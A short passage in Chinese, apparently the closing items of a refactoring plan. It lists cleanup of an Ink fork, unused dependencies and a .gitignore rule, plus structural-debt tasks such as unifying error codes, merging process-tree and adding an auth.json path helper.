10. **清理**（第 9 节）：删除不可达的 Ink fork 部分与未用依赖，修正 `.gitignore` 的 `.js.map` 规则；按 9.3、9.4、9.5 推进弃用。
11. **结构债**（4.7、4.10、8.3、8.4）：错误码与词表单一来源、`process-tree` 合并、`auth.json` 路径 helper、目录级循环依赖。

